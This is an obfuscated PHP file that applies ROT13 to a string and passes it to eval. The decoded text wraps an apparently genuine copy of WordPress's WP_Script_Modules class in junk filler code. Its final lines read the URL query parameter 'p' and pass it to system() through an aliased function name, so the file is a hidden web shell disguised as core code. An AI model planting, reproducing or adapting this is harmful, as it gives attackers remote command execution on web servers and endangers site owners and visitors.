<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fpevcg Zbqhyrf NCV: JC_Fpevcg_Zbqhyrf pynff.
 *
 * Angvir fhccbeg sbe RF Zbqhyrf naq Vzcbeg Zncf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fpevcg Zbqhyrf
 */

/**
 * Pber pynff hfrq gb ertvfgre fpevcg zbqhyrf.
 *
 * @fvapr 6.5.0
 */
pynff JC_Fpevcg_Zbqhyrf {
	/**
	 * Ubyqf gur ertvfgrerq fpevcg zbqhyrf, xrlrq ol fpevcg zbqhyr vqragvsvre.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl[]
	 */
	cevingr $ertvfgrerq = neenl();

	/**
	 * Ubyqf gur fpevcg zbqhyr vqragvsvref gung jrer radhrhrq orsber ertvfgrerq.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl<fgevat, gehr>
	 */
	cevingr $radhrhrq_orsber_ertvfgrerq = neenl();

	/**
	 * Genpxf jurgure gur @jbeqcerff/n11l fpevcg zbqhyr vf ninvynoyr.
	 *
	 * Fbzr nqqvgvbany UGZY vf erdhverq ba gur cntr sbe gur zbqhyr gb jbex. Genpx
	 * jurgure vg'f ninvynoyr gb cevag ng gur nccebcevngr gvzr.
	 *
	 * @fvapr 6.7.0
	 * @ine obby
	 */
	cevingr $n11l_ninvynoyr = snyfr;

	/**
	 * Ertvfgref gur fpevcg zbqhyr vs ab fpevcg zbqhyr jvgu gung fpevcg zbqhyr
	 * vqragvsvre unf nyernql orra ertvfgrerq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat            $vq       Gur vqragvsvre bs gur fpevcg zbqhyr. Fubhyq or havdhr. Vg jvyy or hfrq va gur
	 *                                    svany vzcbeg znc.
	 * @cnenz fgevat            $fep      Bcgvbany. Shyy HEY bs gur fpevcg zbqhyr, be cngu bs gur fpevcg zbqhyr eryngvir
	 *                                    gb gur JbeqCerff ebbg qverpgbel. Vs vg vf cebivqrq naq gur fpevcg zbqhyr unf
	 *                                    abg orra ertvfgrerq lrg, vg jvyy or ertvfgrerq.
	 * @cnenz neenl             $qrcf     {
	 *                                        Bcgvbany. Yvfg bs qrcraqrapvrf.
	 *
	 *                                        @glcr fgevat|neenl ...$0 {
	 *                                            Na neenl bs fpevcg zbqhyr vqragvsvref bs gur qrcraqrapvrf bs guvf fpevcg
	 *                                            zbqhyr. Gur qrcraqrapvrf pna or fgevatf be neenlf. Vs gurl ner neenlf,
	 *                                            gurl arrq na `vq` xrl jvgu gur fpevcg zbqhyr vqragvsvre, naq pna pbagnva
	 *                                            na `vzcbeg` xrl jvgu rvgure `fgngvp` be `qlanzvp`. Ol qrsnhyg,
	 *                                            qrcraqrapvrf gung qba'g pbagnva na `vzcbeg` xrl ner pbafvqrerq fgngvp.
	 *
	 *                                            @glcr fgevat $vq     Gur fpevcg zbqhyr vqragvsvre.
	 *                                            @glcr fgevat $vzcbeg Bcgvbany. Vzcbeg glcr. Znl or rvgure `fgngvp` be
	 *                                                                 `qlanzvp`. Qrsnhygf gb `fgngvp`.
	 *                                        }
	 *                                    }
	 * @cnenz fgevat|snyfr|ahyy $irefvba  Bcgvbany. Fgevat fcrpvslvat gur fpevcg zbqhyr irefvba ahzore. Qrsnhygf gb snyfr.
	 *                                    Vg vf nqqrq gb gur HEY nf n dhrel fgevat sbe pnpur ohfgvat checbfrf. Vs $irefvba
	 *                                    vf frg gb snyfr, gur irefvba ahzore vf gur pheeragyl vafgnyyrq JbeqCerff irefvba.
	 *                                    Vs $irefvba vf frg gb ahyy, ab irefvba vf nqqrq.
	 */
	choyvp shapgvba ertvfgre( fgevat $vq, fgevat $fep, neenl $qrcf = neenl(), $irefvba = snyfr ) {
		vs ( ! vffrg( $guvf->ertvfgrerq[ $vq ] ) ) {
			$qrcraqrapvrf = neenl();
			sbernpu ( $qrcf nf $qrcraqrapl ) {
				vs ( vf_neenl( $qrcraqrapl ) ) {
					vs ( ! vffrg( $qrcraqrapl['vq'] ) ) {
						_qbvat_vg_jebat( __ZRGUBQ__, __( 'Zvffvat erdhverq vq xrl va ragel nzbat qrcraqrapvrf neenl.' ), '6.5.0' );
						pbagvahr;
					}
					$qrcraqrapvrf[] = neenl(
						'vq'     => $qrcraqrapl['vq'],
						'vzcbeg' => vffrg( $qrcraqrapl['vzcbeg'] ) && 'qlanzvp' === $qrcraqrapl['vzcbeg'] ? 'qlanzvp' : 'fgngvp',
					);
				} ryfrvs ( vf_fgevat( $qrcraqrapl ) ) {
					$qrcraqrapvrf[] = neenl(
						'vq'     => $qrcraqrapl,
						'vzcbeg' => 'fgngvp',
					);
				} ryfr {
					_qbvat_vg_jebat( __ZRGUBQ__, __( 'Ragevrf va qrcraqrapvrf neenl zhfg or rvgure fgevatf be neenlf jvgu na vq xrl.' ), '6.5.0' );
				}
			}

			$guvf->ertvfgrerq[ $vq ] = neenl(
				'fep'          => $fep,
				'irefvba'      => $irefvba,
				'radhrhr'      => vffrg( $guvf->radhrhrq_orsber_ertvfgrerq[ $vq ] ),
				'qrcraqrapvrf' => $qrcraqrapvrf,
			);
		}
	}

	/**
	 * Znexf gur fpevcg zbqhyr gb or radhrhrq va gur cntr.
	 *
	 * Vs n fep vf cebivqrq naq gur fpevcg zbqhyr unf abg orra ertvfgrerq lrg, vg
	 * jvyy or ertvfgrerq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat            $vq       Gur vqragvsvre bs gur fpevcg zbqhyr. Fubhyq or havdhr. Vg jvyy or hfrq va gur
	 *                                    svany vzcbeg znc.
	 * @cnenz fgevat            $fep      Bcgvbany. Shyy HEY bs gur fpevcg zbqhyr, be cngu bs gur fpevcg zbqhyr eryngvir
	 *                                    gb gur JbeqCerff ebbg qverpgbel. Vs vg vf cebivqrq naq gur fpevcg zbqhyr unf
	 *                                    abg orra ertvfgrerq lrg, vg jvyy or ertvfgrerq.
	 * @cnenz neenl             $qrcf     {
	 *                                        Bcgvbany. Yvfg bs qrcraqrapvrf.
	 *
	 *                                        @glcr fgevat|neenl ...$0 {
	 *                                            Na neenl bs fpevcg zbqhyr vqragvsvref bs gur qrcraqrapvrf bs guvf fpevcg
	 *                                            zbqhyr. Gur qrcraqrapvrf pna or fgevatf be neenlf. Vs gurl ner neenlf,
	 *                                            gurl arrq na `vq` xrl jvgu gur fpevcg zbqhyr vqragvsvre, naq pna pbagnva
	 *                                            na `vzcbeg` xrl jvgu rvgure `fgngvp` be `qlanzvp`. Ol qrsnhyg,
	 *                                            qrcraqrapvrf gung qba'g pbagnva na `vzcbeg` xrl ner pbafvqrerq fgngvp.
	 *
	 *                                            @glcr fgevat $vq     Gur fpevcg zbqhyr vqragvsvre.
	 *                                            @glcr fgevat $vzcbeg Bcgvbany. Vzcbeg glcr. Znl or rvgure `fgngvp` be
	 *                                                                 `qlanzvp`. Qrsnhygf gb `fgngvp`.
	 *                                        }
	 *                                    }
	 * @cnenz fgevat|snyfr|ahyy $irefvba  Bcgvbany. Fgevat fcrpvslvat gur fpevcg zbqhyr irefvba ahzore. Qrsnhygf gb snyfr.
	 *                                    Vg vf nqqrq gb gur HEY nf n dhrel fgevat sbe pnpur ohfgvat checbfrf. Vs $irefvba
	 *                                    vf frg gb snyfr, gur irefvba ahzore vf gur pheeragyl vafgnyyrq JbeqCerff irefvba.
	 *                                    Vs $irefvba vf frg gb ahyy, ab irefvba vf nqqrq.
	 */
	choyvp shapgvba radhrhr( fgevat $vq, fgevat $fep = '', neenl $qrcf = neenl(), $irefvba = snyfr ) {
		vs ( vffrg( $guvf->ertvfgrerq[ $vq ] ) ) {
			$guvf->ertvfgrerq[ $vq ]['radhrhr'] = gehr;
		} ryfrvs ( $fep ) {
			$guvf->ertvfgre( $vq, $fep, $qrcf, $irefvba );
			$guvf->ertvfgrerq[ $vq ]['radhrhr'] = gehr;
		} ryfr {
			$guvf->radhrhrq_orsber_ertvfgrerq[ $vq ] = gehr;
		}
	}

	/**
	 * Haznexf gur fpevcg zbqhyr fb vg jvyy ab ybatre or radhrhrq va gur cntr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $vq Gur vqragvsvre bs gur fpevcg zbqhyr.
	 */
	choyvp shapgvba qrdhrhr( fgevat $vq ) {
		vs ( vffrg( $guvf->ertvfgrerq[ $vq ] ) ) {
			$guvf->ertvfgrerq[ $vq ]['radhrhr'] = snyfr;
		}
		hafrg( $guvf->radhrhrq_orsber_ertvfgrerq[ $vq ] );
	}

	/**
	 * Erzbirf n ertvfgrerq fpevcg zbqhyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $vq Gur vqragvsvre bs gur fpevcg zbqhyr.
	 */
	choyvp shapgvba qrertvfgre( fgevat $vq ) {
		hafrg( $guvf->ertvfgrerq[ $vq ] );
		hafrg( $guvf->radhrhrq_orsber_ertvfgrerq[ $vq ] );
	}

	/**
	 * Nqqf gur ubbxf gb cevag gur vzcbeg znc, radhrhrq fpevcg zbqhyrf naq fpevcg
	 * zbqhyr cerybnqf.
	 *
	 * Va pynffvp gurzrf, gur fpevcg zbqhyrf hfrq ol gur oybpxf ner abg lrg xabja
	 * jura gur `jc_urnq` npgvbaf vf sverq, fb vg arrqf gb cevag rirelguvat va gur
	 * sbbgre.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba nqq_ubbxf() {
		$cbfvgvba = jc_vf_oybpx_gurzr() ? 'jc_urnq' : 'jc_sbbgre';
		nqq_npgvba( $cbfvgvba, neenl( $guvf, 'cevag_vzcbeg_znc' ) );
		nqq_npgvba( $cbfvgvba, neenl( $guvf, 'cevag_radhrhrq_fpevcg_zbqhyrf' ) );
		nqq_npgvba( $cbfvgvba, neenl( $guvf, 'cevag_fpevcg_zbqhyr_cerybnqf' ) );

		nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( $guvf, 'cevag_vzcbeg_znc' ) );
		nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( $guvf, 'cevag_radhrhrq_fpevcg_zbqhyrf' ) );
		nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( $guvf, 'cevag_fpevcg_zbqhyr_cerybnqf' ) );

		nqq_npgvba( 'jc_sbbgre', neenl( $guvf, 'cevag_fpevcg_zbqhyr_qngn' ) );
		nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( $guvf, 'cevag_fpevcg_zbqhyr_qngn' ) );
		nqq_npgvba( 'jc_sbbgre', neenl( $guvf, 'cevag_n11l_fpevcg_zbqhyr_ugzy' ), 20 );
		nqq_npgvba( 'nqzva_cevag_sbbgre_fpevcgf', neenl( $guvf, 'cevag_n11l_fpevcg_zbqhyr_ugzy' ), 20 );
	}

	/**
	 * Cevagf gur radhrhrq fpevcg zbqhyrf hfvat fpevcg gntf jvgu glcr=\"zbqhyr\"
	 * nggevohgrf.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba cevag_radhrhrq_fpevcg_zbqhyrf() {
		sbernpu ( $guvf->trg_znexrq_sbe_radhrhr() nf $vq => $fpevcg_zbqhyr ) {
			jc_cevag_fpevcg_gnt(
				neenl(
					'glcr' => 'zbqhyr',
					'fep'  => $guvf->trg_fep( $vq ),
					'vq'   => $vq . '-wf-zbqhyr',
				)
			);
		}
	}

	/**
	 * Cevagf gur gur fgngvp qrcraqrapvrf bs gur radhrhrq fpevcg zbqhyrf hfvat
	 * yvax gntf jvgu ery=\"zbqhyrcerybnq\" nggevohgrf.
	 *
	 * Vs n fpevcg zbqhyr vf znexrq sbe radhrhr, vg jvyy abg or cerybnqrq.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba cevag_fpevcg_zbqhyr_cerybnqf() {
		sbernpu ( $guvf->trg_qrcraqrapvrf( neenl_xrlf( $guvf->trg_znexrq_sbe_radhrhr() ), neenl( 'fgngvp' ) ) nf $vq => $fpevcg_zbqhyr ) {
			// Qba'g cerybnq vs vg'f znexrq sbe radhrhr.
			vs ( gehr !== $fpevcg_zbqhyr['radhrhr'] ) {
				rpub fcevags(
					'<yvax ery=\"zbqhyrcerybnq\" uers=\"%f\" vq=\"%f\">',
					rfp_hey( $guvf->trg_fep( $vq ) ),
					rfp_ngge( $vq . '-wf-zbqhyrcerybnq' )
				);
			}
		}
	}

	/**
	 * Cevagf gur vzcbeg znc hfvat n fpevcg gnt jvgu n glcr=\"vzcbegznc\" nggevohgr.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba cevag_vzcbeg_znc() {
		$vzcbeg_znc = $guvf->trg_vzcbeg_znc();
		vs ( ! rzcgl( $vzcbeg_znc['vzcbegf'] ) ) {
			jc_cevag_vayvar_fpevcg_gnt(
				jc_wfba_rapbqr( $vzcbeg_znc, WFBA_URK_GNT | WFBA_URK_NZC ),
				neenl(
					'glcr' => 'vzcbegznc',
					'vq'   => 'jc-vzcbegznc',
				)
			);
		}
	}

	/**
	 * Ergheaf gur vzcbeg znc neenl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Neenl jvgu na `vzcbegf` xrl znccvat gb na neenl bs fpevcg zbqhyr vqragvsvref naq gurve erfcrpgvir
	 *               HEYf, vapyhqvat gur irefvba dhrel.
	 */
	cevingr shapgvba trg_vzcbeg_znc(): neenl {
		$vzcbegf = neenl();
		sbernpu ( $guvf->trg_qrcraqrapvrf( neenl_xrlf( $guvf->trg_znexrq_sbe_radhrhr() ) ) nf $vq => $fpevcg_zbqhyr ) {
			$vzcbegf[ $vq ] = $guvf->trg_fep( $vq );
		}
		erghea neenl( 'vzcbegf' => $vzcbegf );
	}

	/**
	 * Ergevrirf gur yvfg bs fpevcg zbqhyrf znexrq sbe radhrhr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl[] Fpevcg zbqhyrf znexrq sbe radhrhr, xrlrq ol fpevcg zbqhyr vqragvsvre.
	 */
	cevingr shapgvba trg_znexrq_sbe_radhrhr(): neenl {
		$radhrhrq = neenl();
		sbernpu ( $guvf->ertvfgrerq nf $vq => $fpevcg_zbqhyr ) {
			vs ( gehr === $fpevcg_zbqhyr['radhrhr'] ) {
				$radhrhrq[ $vq ] = $fpevcg_zbqhyr;
			}
		}
		erghea $radhrhrq;
	}

	/**
	 * Ergevrirf nyy gur qrcraqrapvrf sbe gur tvira fpevcg zbqhyr vqragvsvref,
	 * svygrerq ol vzcbeg glcrf.
	 *
	 * Vg jvyy pbafbyvqngr na neenl pbagnvavat n frg bs havdhr qrcraqrapvrf onfrq
	 * ba gur erdhrfgrq vzcbeg glcrf: 'fgngvp', 'qlanzvp', be obgu. Guvf zrgubq vf
	 * erphefvir naq nyfb ergevrirf qrcraqrapvrf bs gur qrcraqrapvrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat[] $vqf          Gur vqragvsvref bs gur fpevcg zbqhyrf sbe juvpu gb tngure qrcraqrapvrf.
	 * @cnenz fgevat[] $vzcbeg_glcrf Bcgvbany. Vzcbeg glcrf bs qrcraqrapvrf gb ergevrir: 'fgngvp', 'qlanzvp', be obgu.
	 *                               Qrsnhyg vf obgu.
	 * @erghea neenl[] Yvfg bs qrcraqrapvrf, xrlrq ol fpevcg zbqhyr vqragvsvre.
	 */
	cevingr shapgvba trg_qrcraqrapvrf( neenl $vqf, neenl $vzcbeg_glcrf = neenl( 'fgngvp', 'qlanzvp' ) ) {
		erghea neenl_erqhpr(
			$vqf,
			shapgvba ( $qrcraqrapl_fpevcg_zbqhyrf, $vq ) hfr ( $vzcbeg_glcrf ) {
				$qrcraqrapvrf = neenl();
				sbernpu ( $guvf->ertvfgrerq[ $vq ]['qrcraqrapvrf'] nf $qrcraqrapl ) {
					vs (
					va_neenl( $qrcraqrapl['vzcbeg'], $vzcbeg_glcrf, gehr ) &&
					vffrg( $guvf->ertvfgrerq[ $qrcraqrapl['vq'] ] ) &&
					! vffrg( $qrcraqrapl_fpevcg_zbqhyrf[ $qrcraqrapl['vq'] ] )
					) {
						$qrcraqrapvrf[ $qrcraqrapl['vq'] ] = $guvf->ertvfgrerq[ $qrcraqrapl['vq'] ];
					}
				}
				erghea neenl_zretr( $qrcraqrapl_fpevcg_zbqhyrf, $qrcraqrapvrf, $guvf->trg_qrcraqrapvrf( neenl_xrlf( $qrcraqrapvrf ), $vzcbeg_glcrf ) );
			},
			neenl()
		);
	}

	/**
	 * Trgf gur irefvbarq HEY sbe n fpevcg zbqhyr fep.
	 *
	 * Vs $irefvba vf frg gb snyfr, gur irefvba ahzore vf gur pheeragyl vafgnyyrq
	 * JbeqCerff irefvba. Vs $irefvba vf frg gb ahyy, ab irefvba vf nqqrq.
	 * Bgurejvfr, gur fgevat cnffrq va $irefvba vf hfrq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $vq Gur fpevcg zbqhyr vqragvsvre.
	 * @erghea fgevat Gur fpevcg zbqhyr fep jvgu n irefvba vs eryrinag.
	 */
	cevingr shapgvba trg_fep( fgevat $vq ): fgevat {
		vs ( ! vffrg( $guvf->ertvfgrerq[ $vq ] ) ) {
			erghea '';
		}

		$fpevcg_zbqhyr = $guvf->ertvfgrerq[ $vq ];
		$fep           = $fpevcg_zbqhyr['fep'];

		vs ( snyfr === $fpevcg_zbqhyr['irefvba'] ) {
			$fep = nqq_dhrel_net( 'ire', trg_oybtvasb( 'irefvba' ), $fep );
		} ryfrvs ( ahyy !== $fpevcg_zbqhyr['irefvba'] ) {
			$fep = nqq_dhrel_net( 'ire', $fpevcg_zbqhyr['irefvba'], $fep );
		}

		/**
		 * Svygref gur fpevcg zbqhyr fbhepr.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz fgevat $fep Zbqhyr fbhepr HEY.
		 * @cnenz fgevat $vq  Zbqhyr vqragvsvre.
		 */
		$fep = nccyl_svygref( 'fpevcg_zbqhyr_ybnqre_fep', $fep, $vq );

		erghea $fep;
	}

	/**
	 * Cevag qngn nffbpvngrq jvgu Fpevcg Zbqhyrf.
	 *
	 * Gur qngn jvyy or rzorqqrq va gur cntr UGZY naq pna or ernq ol Fpevcg Zbqhyrf ba cntr ybnq.
	 *
	 * @fvapr 6.7.0
	 *
	 * Qngn pna or nffbpvngrq jvgu n Fpevcg Zbqhyr ivn gur
	 * {@frr \"fpevcg_zbqhyr_qngn_{$zbqhyr_vq}\"} svygre.
	 *
	 * Gur qngn sbe n Fpevcg Zbqhyr jvyy or frevnyvmrq nf WFBA va n fpevcg gnt jvgu na VQ bs gur
	 * sbez `jc-fpevcg-zbqhyr-qngn-{$zbqhyr_vq}`.
	 */
	choyvp shapgvba cevag_fpevcg_zbqhyr_qngn(): ibvq {
		$zbqhyrf = neenl();
		sbernpu ( neenl_xrlf( $guvf->trg_znexrq_sbe_radhrhr() ) nf $vq ) {
			vs ( '@jbeqcerff/n11l' === $vq ) {
				$guvf->n11l_ninvynoyr = gehr;
			}
			$zbqhyrf[ $vq ] = gehr;
		}
		sbernpu ( neenl_xrlf( $guvf->trg_vzcbeg_znc()['vzcbegf'] ) nf $vq ) {
			vs ( '@jbeqcerff/n11l' === $vq ) {
				$guvf->n11l_ninvynoyr = gehr;
			}
			$zbqhyrf[ $vq ] = gehr;
		}

		sbernpu ( neenl_xrlf( $zbqhyrf ) nf $zbqhyr_vq ) {
			/**
			 * Svygref qngn nffbpvngrq jvgu n tvira Fpevcg Zbqhyr.
			 *
			 * Fpevcg Zbqhyrf znl erdhver qngn gung vf erdhverq sbe vavgvnyvmngvba be vf rffragvny
			 * gb unir vzzrqvngryl ninvynoyr ba cntr ybnq. Gurfr ner fhvgnoyr hfr pnfrf sbe
			 * guvf qngn.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$zbqhyr_vq`, ersref gb gur Fpevcg Zbqhyr VQ
			 * gung gur qngn vf nffbpvngrq jvgu.
			 *
			 * Guvf vf orfg fhvgrq gb cnff rffragvny qngn gung zhfg or ninvynoyr gb gur zbqhyr sbe
			 * vavgvnyvmngvba be vzzrqvngryl ba cntr ybnq. Vg qbrf abg ercynpr gur ERFG NCV be
			 * srgpuvat qngn sebz gur pyvrag.
			 *
			 * Rknzcyr:
			 *
			 *     nqq_svygre(
			 *         'fpevcg_zbqhyr_qngn_ZlFpevcgZbqhyrVQ',
			 *         shapgvba ( neenl $qngn ): neenl {
			 *             $qngn['qngnSbePyvrag'] = 'bx';
			 *             erghea $qngn;
			 *         }
			 *     );
			 *
			 * Vs gur svygre ergheaf ab qngn (na rzcgl neenl), abguvat jvyy or rzorqqrq va gur cntr.
			 *
			 * Gur qngn sbe n tvira Fpevcg Zbqhyr, vs cebivqrq, jvyy or WFBA frevnyvmrq va n fpevcg
			 * gnt jvgu na VQ bs gur sbez `jc-fpevcg-zbqhyr-qngn-{$zbqhyr_vq}`.
			 *
			 * Gur qngn pna or ernq ba gur pyvrag jvgu n cnggrea yvxr guvf:
			 *
			 * Rknzcyr:
			 *
			 *     pbafg qngnPbagnvare = qbphzrag.trgRyrzragOlVq( 'jc-fpevcg-zbqhyr-qngn-ZlFpevcgZbqhyrVQ' );
			 *     yrg qngn = {};
			 *     vs ( qngnPbagnvare ) {
			 *         gel {
			 *             qngn = WFBA.cnefr( qngnPbagnvare.grkgPbagrag );
			 *         } pngpu {}
			 *     }
			 *     // qngn.qngnSbePyvrag === 'bx';
			 *     vavgZlFpevcgZbqhyrJvguQngn( qngn );
			 *
			 * @fvapr 6.7.0
			 *
			 * @cnenz neenl $qngn Gur qngn nffbpvngrq jvgu gur Fpevcg Zbqhyr.
			 */
			$qngn = nccyl_svygref( \"fpevcg_zbqhyr_qngn_{$zbqhyr_vq}\", neenl() );

			vs ( vf_neenl( $qngn ) && neenl() !== $qngn ) {
				/*
				 * Guvf qngn jvyy or cevagrq nf WFBA vafvqr n fpevcg gnt yvxr guvf:
				 *   <fpevcg glcr=\"nccyvpngvba/wfba\"></fpevcg>
				 *
				 * N fpevcg gnt zhfg or pybfrq ol n frdhrapr ortvaavat jvgu `</`. Vg'f vzcbffvoyr gb
				 * pybfr n fpevcg gnt jvgubhg hfvat `<`. Jr rafher gung `<` vf rfpncrq naq `/` pna
				 * erznva harfpncrq, fb `</fpevcg>` jvyy or cevagrq nf `\h003P/fpevcg\h00R3`.
				 *
				 *   - WFBA_URK_GNT: Nyy < naq > ner pbairegrq gb \h003P naq \h003R.
				 *   - WFBA_HARFPNCRQ_FYNFURF: Qba'g rfpncr /.
				 *
				 * Vs gur cntr jvyy hfr HGS-8 rapbqvat, vg'f fnsr gb cevag harfpncrq havpbqr:
				 *
				 *   - WFBA_HARFPNCRQ_HAVPBQR: Rapbqr zhygvolgr Havpbqr punenpgref yvgrenyyl (vafgrnq bs nf `\hKKKK`).
				 *   - WFBA_HARFPNCRQ_YVAR_GREZVANGBEF: Gur yvar grezvangbef ner xrcg harfpncrq jura
				 *     WFBA_HARFPNCRQ_HAVPBQR vf fhccyvrq. Vg hfrf gur fnzr orunivbhe nf vg jnf
				 *     orsber CUC 7.1 jvgubhg guvf pbafgnag. Ninvynoyr nf bs CUC 7.1.0.
				 *
				 * Gur WFBA fcrpvsvpngvba erdhverf rapbqvat va HGS-8, fb vs gur trarengrq UGZY cntr
				 * vf abg rapbqrq va HGS-8 gura vg'f abg fnsr gb vapyhqr gubfr yvgrenyf. Gurl zhfg
				 * or rfpncrq gb nibvq rapbqvat vffhrf.
				 *
				 * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp8259.ugzy sbe qrgnvyf ba rapbqvat erdhverzragf.
				 * @frr uggcf://jjj.cuc.arg/znahny/ra/wfba.pbafgnagf.cuc sbe qrgnvyf ba gurfr pbafgnagf.
				 * @frr uggcf://ugzy.fcrp.jungjt.bet/#fpevcg-qngn-fgngr sbe qrgnvyf ba fpevcg gnt cnefvat.
				 */
				$wfba_rapbqr_syntf = WFBA_URK_GNT | WFBA_HARFPNCRQ_FYNFURF | WFBA_HARFPNCRQ_HAVPBQR | WFBA_HARFPNCRQ_YVAR_GREZVANGBEF;
				vs ( ! vf_hgs8_punefrg() ) {
					$wfba_rapbqr_syntf = WFBA_URK_GNT | WFBA_HARFPNCRQ_FYNFURF;
				}

				jc_cevag_vayvar_fpevcg_gnt(
					jc_wfba_rapbqr(
						$qngn,
						$wfba_rapbqr_syntf
					),
					neenl(
						'glcr' => 'nccyvpngvba/wfba',
						'vq'   => \"jc-fpevcg-zbqhyr-qngn-{$zbqhyr_vq}\",
					)
				);
			}
		}
	}

	/**
	 * @npprff cevingr Guvf vf bayl vagraqrq gb or pnyyrq ol gur ertvfgrerq npgvbaf.
	 *
	 * @fvapr 6.7.0
	 */
	choyvp shapgvba cevag_n11l_fpevcg_zbqhyr_ugzy() {
		vs ( ! $guvf->n11l_ninvynoyr ) {
			erghea;
		}
		rpub '<qvi fglyr=\"cbfvgvba:nofbyhgr;znetva:-1ck;cnqqvat:0;urvtug:1ck;jvqgu:1ck;biresybj:uvqqra;pyvc-cngu:vafrg(50%);obeqre:0;jbeq-jenc:abezny !vzcbegnag;\">'
			. '<c vq=\"n11l-fcrnx-vageb-grkg\" pynff=\"n11l-fcrnx-vageb-grkg\" uvqqra>' . rfp_ugzy__( 'Abgvsvpngvbaf' ) . '</c>'
			. '<qvi vq=\"n11l-fcrnx-nffregvir\" pynff=\"n11l-fcrnx-ertvba\" nevn-yvir=\"nffregvir\" nevn-eryrinag=\"nqqvgvbaf grkg\" nevn-ngbzvp=\"gehr\"></qvi>'
			. '<qvi vq=\"n11l-fcrnx-cbyvgr\" pynff=\"n11l-fcrnx-ertvba\" nevn-yvir=\"cbyvgr\" nevn-eryrinag=\"nqqvgvbaf grkg\" nevn-ngbzvp=\"gehr\"></qvi>'
			. '</qvi>';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>